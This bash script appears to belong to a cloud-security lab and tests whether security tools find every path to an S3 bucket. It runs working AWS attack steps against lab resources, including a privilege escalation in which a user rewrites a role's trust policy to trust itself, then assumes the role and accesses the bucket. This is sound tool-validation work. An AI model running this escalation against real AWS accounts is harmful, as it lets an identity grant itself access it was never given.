#!/bin/bash

# Demo script for test-direct-and-indirect-bucket-access-multi-path
# This scenario demonstrates THREE distinct reachability paths to the same S3 bucket:
#
#   Path 1 (Direct):    user-direct      → (direct S3 policy grant) → bucket
#   Path 2 (Indirect):  user-assumer     → (sts:AssumeRole)          → role-trusted    → bucket
#   Path 3 (Indirect):  user-trustbypass → (iam:UpdateAssumeRolePolicy, then sts:AssumeRole)
#                                          → role-untrusted (initially trusts only ec2.amazonaws.com) → bucket
#
# Path 3 is a genuine two-step privilege escalation: user-trustbypass rewrites the
# role's trust policy to add itself as a trusted principal, THEN assumes the role.
#
# This is designed to validate reverse blast radius / "who can reach this bucket"
# queries in graph and CSPM tools: a correct answer must surface all three starting
# principals, not just the one with a direct policy grant.

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Track pass/fail per path for the final summary table
PATH1_STATUS="FAIL"
PATH2_STATUS="FAIL"
PATH3_STATUS="FAIL"

# Display a non-attack command with identity context
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command with identity context
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Direct and Indirect Bucket Access${NC}"
echo -e "${GREEN}Multi-Path Reachability Test Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

echo "This scenario demonstrates THREE distinct paths to the same S3 bucket:"
echo "  Path 1 (Direct):   user-direct → S3 bucket"
echo "  Path 2 (Indirect):  user-assumer → sts:AssumeRole → role-trusted → S3 bucket"
echo "  Path 3 (Indirect):  user-trustbypass → iam:UpdateAssumeRolePolicy + sts:AssumeRole"
echo "                      → role-untrusted → S3 bucket"
echo ""
echo "A properly configured security/graph tool should detect ALL THREE principals"
echo "when performing a reverse blast radius query on the bucket."
echo ""

# Check if AWS CLI is installed
if ! command -v aws &> /dev/null; then
    echo -e "${RED}Error: AWS CLI is not installed or not in PATH${NC}"
    exit 1
fi

# Check if jq is installed
if ! command -v jq &> /dev/null; then
    echo -e "${RED}Error: jq is not installed or not in PATH${NC}"
    echo "Please install jq to parse JSON outputs"
    exit 1
fi

# Navigate to the Terraform root directory (4 levels up from a tool-testing scenario directory)
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TERRAFORM_ROOT="$(cd "$SCRIPT_DIR/../../../.." && pwd)"

# Step 1: Retrieve credentials and configuration from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd "$TERRAFORM_ROOT"

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.tool_testing_test_direct_and_indirect_bucket_access_multi_path.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials and resource information for all three starting principals
USER_DIRECT_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.user_direct_access_key_id')
USER_DIRECT_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.user_direct_secret_access_key')
USER_DIRECT_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.user_direct_name')

USER_ASSUMER_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.user_assumer_access_key_id')
USER_ASSUMER_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.user_assumer_secret_access_key')
USER_ASSUMER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.user_assumer_name')

ROLE_TRUSTED_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.role_trusted_arn')
ROLE_TRUSTED_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.role_trusted_name')

USER_TRUSTBYPASS_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.user_trustbypass_access_key_id')
USER_TRUSTBYPASS_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.user_trustbypass_secret_access_key')
USER_TRUSTBYPASS_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.user_trustbypass_name')

ROLE_UNTRUSTED_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.role_untrusted_arn')
ROLE_UNTRUSTED_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.role_untrusted_name')

BUCKET_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.target_bucket_name')

if [ "$USER_DIRECT_ACCESS_KEY_ID" == "null" ] || [ -z "$USER_DIRECT_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region from Terraform
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved credentials for:"
echo "  - user-direct:      $USER_DIRECT_NAME"
echo "  - user-assumer:     $USER_ASSUMER_NAME"
echo "  - role-trusted:     $ROLE_TRUSTED_NAME"
echo "  - user-trustbypass: $USER_TRUSTBYPASS_NAME"
echo "  - role-untrusted:   $ROLE_UNTRUSTED_NAME"
echo "  - bucket:           $BUCKET_NAME"
echo "  - region:           $AWS_REGION"
echo "  ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_direct_creds() {
    export AWS_ACCESS_KEY_ID="$USER_DIRECT_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$USER_DIRECT_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_assumer_creds() {
    export AWS_ACCESS_KEY_ID="$USER_ASSUMER_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$USER_ASSUMER_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_trustbypass_creds() {
    export AWS_ACCESS_KEY_ID="$USER_TRUSTBYPASS_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$USER_TRUSTBYPASS_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source shared permission restriction library (tool-testing is 4 levels deep)
source "$SCRIPT_DIR/../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [OBSERVATION] Step 2: Get account ID using readonly credentials
echo -e "${YELLOW}Step 2: Getting account ID${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# =============================================================================
# PATH 1: Direct Access
# =============================================================================
echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}PATH 1: Direct Access (user-direct)${NC}"
echo -e "${BLUE}========================================${NC}\n"

# [EXPLOIT] Step 3: Verify user-direct identity
echo -e "${YELLOW}Step 3: Verifying user-direct identity${NC}"
use_direct_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"

show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$USER_DIRECT_NAME"* ]]; then
    echo -e "${RED}Error: Not running as $USER_DIRECT_NAME${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified user-direct identity${NC}\n"

# [EXPLOIT] Step 4: Directly put and get an object with user-direct
echo -e "${YELLOW}Step 4: Directly writing and reading an object in the bucket${NC}"
echo "Bucket: $BUCKET_NAME"
echo "" > /tmp/dimp-test-direct.txt
echo "written-by-user-direct" > /tmp/dimp-test-direct.txt

show_attack_cmd "Attacker" "aws s3 cp /tmp/dimp-test-direct.txt \"s3://$BUCKET_NAME/dimp-test-direct.txt\""
if aws s3 cp /tmp/dimp-test-direct.txt "s3://$BUCKET_NAME/dimp-test-direct.txt" 2>/dev/null; then
    echo -e "${GREEN}✓ Successfully wrote object directly${NC}"
else
    echo -e "${RED}✗ Failed to write object${NC}"
    PATH1_STATUS="FAIL"
fi

show_attack_cmd "Attacker" "aws s3 cp \"s3://$BUCKET_NAME/dimp-test-direct.txt\" /tmp/dimp-test-direct-readback.txt"
if aws s3 cp "s3://$BUCKET_NAME/dimp-test-direct.txt" /tmp/dimp-test-direct-readback.txt 2>/dev/null; then
    echo -e "${GREEN}✓ Successfully read object back directly${NC}"
    PATH1_STATUS="PASS"
else
    echo -e "${RED}✗ Failed to read object back${NC}"
    PATH1_STATUS="FAIL"
fi
echo ""

if [ "$PATH1_STATUS" == "PASS" ]; then
    echo -e "${GREEN}✅ Path 1 Complete: Direct Access — PASS${NC}\n"
else
    echo -e "${RED}❌ Path 1 Failed: Direct Access — FAIL${NC}\n"
fi

# =============================================================================
# PATH 2: Indirect Access via sts:AssumeRole (already-trusted role)
# =============================================================================
echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}PATH 2: Indirect Access via sts:AssumeRole${NC}"
echo -e "${BLUE}(already-trusted role) — user-assumer → role-trusted${NC}"
echo -e "${BLUE}========================================${NC}\n"

# [EXPLOIT] Step 5: Verify user-assumer identity
echo -e "${YELLOW}Step 5: Verifying user-assumer identity${NC}"
use_assumer_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"

show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$USER_ASSUMER_NAME"* ]]; then
    echo -e "${RED}Error: Not running as $USER_ASSUMER_NAME${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified user-assumer identity${NC}\n"

# [EXPLOIT] Step 6: Verify user-assumer lacks direct bucket access
echo -e "${YELLOW}Step 6: Verifying user-assumer lacks direct bucket access${NC}"
show_cmd "Attacker" "aws s3 ls \"s3://$BUCKET_NAME/\""
if aws s3 ls "s3://$BUCKET_NAME/" 2>/dev/null; then
    echo -e "${RED}⚠ Unexpectedly have direct bucket access${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot access bucket directly (as expected)${NC}"
fi
echo ""

# [EXPLOIT] Step 7: Assume role-trusted with user-assumer (role already trusts this user — no privesc, just a hop)
echo -e "${YELLOW}Step 7: Assuming role-trusted (role already trusts user-assumer)${NC}"
echo "Role ARN: $ROLE_TRUSTED_ARN"

show_attack_cmd "Attacker" "aws sts assume-role --role-arn $ROLE_TRUSTED_ARN --role-session-name demo-session --query 'Credentials' --output json"
CREDENTIALS=$(aws sts assume-role \
    --role-arn "$ROLE_TRUSTED_ARN" \
    --role-session-name demo-session \
    --query 'Credentials' \
    --output json)

if [ $? -ne 0 ] || [ -z "$CREDENTIALS" ]; then
    echo -e "${RED}✗ Failed to assume role-trusted${NC}"
    PATH2_STATUS="FAIL"
else
    export AWS_ACCESS_KEY_ID=$(echo "$CREDENTIALS" | jq -r '.AccessKeyId')
    export AWS_SECRET_ACCESS_KEY=$(echo "$CREDENTIALS" | jq -r '.SecretAccessKey')
    export AWS_SESSION_TOKEN=$(echo "$CREDENTIALS" | jq -r '.SessionToken')
    export AWS_REGION=$AWS_REGION
    export AWS_DEFAULT_REGION="$AWS_REGION"

    show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
    ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
    echo "Current identity: $ROLE_IDENTITY"
    echo -e "${GREEN}✓ Successfully assumed role-trusted${NC}\n"

    # [EXPLOIT] Step 8: Put and get an object as role-trusted
    echo -e "${YELLOW}Step 8: Writing and reading an object in the bucket as role-trusted${NC}"
    echo "written-by-role-trusted" > /tmp/dimp-test-assumer.txt

    show_attack_cmd "Attacker" "aws s3 cp /tmp/dimp-test-assumer.txt \"s3://$BUCKET_NAME/dimp-test-assumer.txt\""
    WRITE_OK=0
    if aws s3 cp /tmp/dimp-test-assumer.txt "s3://$BUCKET_NAME/dimp-test-assumer.txt" 2>/dev/null; then
        echo -e "${GREEN}✓ Successfully wrote object via assumed role${NC}"
        WRITE_OK=1
    else
        echo -e "${RED}✗ Failed to write object${NC}"
    fi

    show_attack_cmd "Attacker" "aws s3 cp \"s3://$BUCKET_NAME/dimp-test-assumer.txt\" /tmp/dimp-test-assumer-readback.txt"
    if [ "$WRITE_OK" == "1" ] && aws s3 cp "s3://$BUCKET_NAME/dimp-test-assumer.txt" /tmp/dimp-test-assumer-readback.txt 2>/dev/null; then
        echo -e "${GREEN}✓ Successfully read object back via assumed role${NC}"
        PATH2_STATUS="PASS"
    else
        echo -e "${RED}✗ Failed to read object back${NC}"
        PATH2_STATUS="FAIL"
    fi
fi
echo ""

if [ "$PATH2_STATUS" == "PASS" ]; then
    echo -e "${GREEN}✅ Path 2 Complete: Indirect Access via sts:AssumeRole — PASS${NC}\n"
else
    echo -e "${RED}❌ Path 2 Failed: Indirect Access via sts:AssumeRole — FAIL${NC}\n"
fi

# =============================================================================
# PATH 3: Indirect Access via iam:UpdateAssumeRolePolicy Trust-Policy Bypass
# =============================================================================
echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}PATH 3: Indirect Access via${NC}"
echo -e "${BLUE}iam:UpdateAssumeRolePolicy Trust-Policy Bypass${NC}"
echo -e "${BLUE}user-trustbypass → role-untrusted${NC}"
echo -e "${BLUE}========================================${NC}\n"

# [EXPLOIT] Step 9: Verify user-trustbypass identity
echo -e "${YELLOW}Step 9: Verifying user-trustbypass identity${NC}"
use_trustbypass_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"

show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$USER_TRUSTBYPASS_NAME"* ]]; then
    echo -e "${RED}Error: Not running as $USER_TRUSTBYPASS_NAME${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified user-trustbypass identity${NC}\n"

# [EXPLOIT] Step 10: Attempt to assume role-untrusted BEFORE the trust bypass (should fail)
echo -e "${YELLOW}Step 10: Attempting to assume role-untrusted before rewriting its trust policy (expected to fail)${NC}"
echo "Role ARN: $ROLE_UNTRUSTED_ARN"
echo "The role currently trusts only ec2.amazonaws.com, so this assume-role attempt is denied."

show_cmd "Attacker" "aws sts assume-role --role-arn $ROLE_UNTRUSTED_ARN --role-session-name pre-bypass-test"
if aws sts assume-role --role-arn "$ROLE_UNTRUSTED_ARN" --role-session-name pre-bypass-test &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly able to assume role-untrusted before the trust bypass${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot assume role-untrusted yet (as expected)${NC}"
fi
echo ""

# [EXPLOIT] Step 11: Rewrite role-untrusted's trust policy to add user-trustbypass (THE ESCALATION)
echo -e "${YELLOW}Step 11: Rewriting role-untrusted's trust policy to add user-trustbypass as a trusted principal${NC}"
echo "This is the privilege escalation step: user-trustbypass grants ITSELF the ability"
echo "to assume role-untrusted by overwriting the role's AssumeRolePolicyDocument."
echo "Before: trusts only ec2.amazonaws.com"
echo "After:  trusts ec2.amazonaws.com AND $USER_TRUSTBYPASS_NAME"
echo ""

NEW_TRUST_POLICY=$(cat <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Service": "ec2.amazonaws.com"
      },
      "Action": "sts:AssumeRole"
    },
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::${ACCOUNT_ID}:user/${USER_TRUSTBYPASS_NAME}"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
EOF
)

show_attack_cmd "Attacker" "aws iam update-assume-role-policy --role-name $ROLE_UNTRUSTED_NAME --policy-document '<trust-policy-adding-self>'"
if aws iam update-assume-role-policy \
    --role-name "$ROLE_UNTRUSTED_NAME" \
    --policy-document "$NEW_TRUST_POLICY"; then
    echo -e "${GREEN}✓ Successfully rewrote role-untrusted's trust policy${NC}"
else
    echo -e "${RED}✗ Failed to update trust policy${NC}"
    exit 1
fi
echo ""

# Wait for IAM policy propagation
echo -e "${YELLOW}Waiting 15 seconds for IAM trust policy propagation...${NC}"
sleep 15
echo -e "${GREEN}✓ Trust policy propagated${NC}\n"

# [EXPLOIT] Step 12: Assume role-untrusted with user-trustbypass (now succeeds)
echo -e "${YELLOW}Step 12: Assuming role-untrusted now that the trust policy has been rewritten${NC}"
echo "Role ARN: $ROLE_UNTRUSTED_ARN"

show_attack_cmd "Attacker" "aws sts assume-role --role-arn $ROLE_UNTRUSTED_ARN --role-session-name demo-session-bypass --query 'Credentials' --output json"
CREDENTIALS=$(aws sts assume-role \
    --role-arn "$ROLE_UNTRUSTED_ARN" \
    --role-session-name demo-session-bypass \
    --query 'Credentials' \
    --output json)

if [ $? -ne 0 ] || [ -z "$CREDENTIALS" ]; then
    echo -e "${RED}✗ Failed to assume role-untrusted${NC}"
    PATH3_STATUS="FAIL"
else
    export AWS_ACCESS_KEY_ID=$(echo "$CREDENTIALS" | jq -r '.AccessKeyId')
    export AWS_SECRET_ACCESS_KEY=$(echo "$CREDENTIALS" | jq -r '.SecretAccessKey')
    export AWS_SESSION_TOKEN=$(echo "$CREDENTIALS" | jq -r '.SessionToken')
    export AWS_REGION=$AWS_REGION
    export AWS_DEFAULT_REGION="$AWS_REGION"

    show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
    ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
    echo "Current identity: $ROLE_IDENTITY"
    echo -e "${GREEN}✓ Successfully assumed role-untrusted via the trust-policy bypass${NC}\n"

    # [EXPLOIT] Step 13: Put and get an object as role-untrusted
    echo -e "${YELLOW}Step 13: Writing and reading an object in the bucket as role-untrusted${NC}"
    echo "written-by-role-untrusted" > /tmp/dimp-test-trustbypass.txt

    show_attack_cmd "Attacker" "aws s3 cp /tmp/dimp-test-trustbypass.txt \"s3://$BUCKET_NAME/dimp-test-trustbypass.txt\""
    WRITE_OK=0
    if aws s3 cp /tmp/dimp-test-trustbypass.txt "s3://$BUCKET_NAME/dimp-test-trustbypass.txt" 2>/dev/null; then
        echo -e "${GREEN}✓ Successfully wrote object via bypassed role${NC}"
        WRITE_OK=1
    else
        echo -e "${RED}✗ Failed to write object${NC}"
    fi

    show_attack_cmd "Attacker" "aws s3 cp \"s3://$BUCKET_NAME/dimp-test-trustbypass.txt\" /tmp/dimp-test-trustbypass-readback.txt"
    if [ "$WRITE_OK" == "1" ] && aws s3 cp "s3://$BUCKET_NAME/dimp-test-trustbypass.txt" /tmp/dimp-test-trustbypass-readback.txt 2>/dev/null; then
        echo -e "${GREEN}✓ Successfully read object back via bypassed role${NC}"
        PATH3_STATUS="PASS"
    else
        echo -e "${RED}✗ Failed to read object back${NC}"
        PATH3_STATUS="FAIL"
    fi
fi
echo ""

if [ "$PATH3_STATUS" == "PASS" ]; then
    echo -e "${GREEN}✅ Path 3 Complete: Indirect Access via Trust-Policy Bypass — PASS${NC}\n"
else
    echo -e "${RED}❌ Path 3 Failed: Indirect Access via Trust-Policy Bypass — FAIL${NC}\n"
fi

# Restore helpful permissions before printing summary
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Final summary
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}✅ DEMONSTRATION COMPLETE${NC}"
echo -e "${GREEN}========================================${NC}"
echo ""
echo -e "${YELLOW}Reachability Path Results:${NC}"
printf "  %-55s %s\n" "Path 1: Direct Access" "$PATH1_STATUS"
printf "  %-55s %s\n" "Path 2: Indirect via sts:AssumeRole (already-trusted)" "$PATH2_STATUS"
printf "  %-55s %s\n" "Path 3: Indirect via UpdateAssumeRolePolicy Trust Bypass" "$PATH3_STATUS"
echo ""

echo -e "${YELLOW}Detection Goal:${NC}"
echo "A graph/CSPM tool asked \"who can access s3://$BUCKET_NAME?\" must return"
echo "ALL THREE of the following principals, not just the one with a direct grant:"
echo "  ✓ $USER_DIRECT_NAME      (direct IAM permissions on the bucket)"
echo "  ✓ $USER_ASSUMER_NAME     (indirect via sts:AssumeRole → $ROLE_TRUSTED_NAME)"
echo "  ✓ $USER_TRUSTBYPASS_NAME (indirect via trust-policy rewrite → $ROLE_UNTRUSTED_NAME)"
echo ""

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "  - s3://$BUCKET_NAME/dimp-test-direct.txt (written by user-direct)"
echo "  - s3://$BUCKET_NAME/dimp-test-assumer.txt (written by role-trusted)"
echo "  - s3://$BUCKET_NAME/dimp-test-trustbypass.txt (written by role-untrusted)"
echo "  - role-untrusted's trust policy now includes user-trustbypass as a trusted principal"
echo "  - /tmp/dimp-test-*.txt local temp files"
echo ""

echo -e "${RED}⚠ Warning: role-untrusted's trust policy has been modified and the bucket now${NC}"
echo -e "${RED}  contains test objects written during this demo.${NC}"
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Clean up credentials from environment
unset AWS_ACCESS_KEY_ID
unset AWS_SECRET_ACCESS_KEY
unset AWS_SESSION_TOKEN

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
